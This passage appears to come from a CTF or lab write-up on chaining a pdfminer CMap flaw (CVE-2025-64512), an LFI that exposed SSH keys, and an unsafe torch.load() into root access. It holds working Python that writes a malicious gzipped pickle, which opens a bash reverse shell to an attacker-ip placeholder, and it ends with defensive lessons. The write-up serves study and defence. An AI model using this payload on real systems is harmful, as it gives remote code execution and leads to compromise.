2. Exploitation

Pickle Payload + Trigger PDF

Generate a gzipped pickle that spawns a reverse shell:

import pickle, gzip, os
class Evil:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"
        return (os.system, (cmd,))
with gzip.open("shell.pickle.gz", "wb") as f:
    pickle.dump(Evil(), f)

📌 torch < 2.6 Before 2.6, torch.load() defaults to weights_only=False (arbitrary pickle). Always load untrusted checkpoints with weights_only=True.

✅ Lessons Learned pdfminer’s CMap path resolution turned a “safe” PDF upload into pickle RCE (CVE-2025-64512). Internal services and LFI on :3000 exposed developer SSH keys. A sudo-wrapped ML trainer still calling torch.load() without weights_only=True completed the path to root. Patch pdfminer, isolate upload processors, and never deserialize untrusted model files as root.
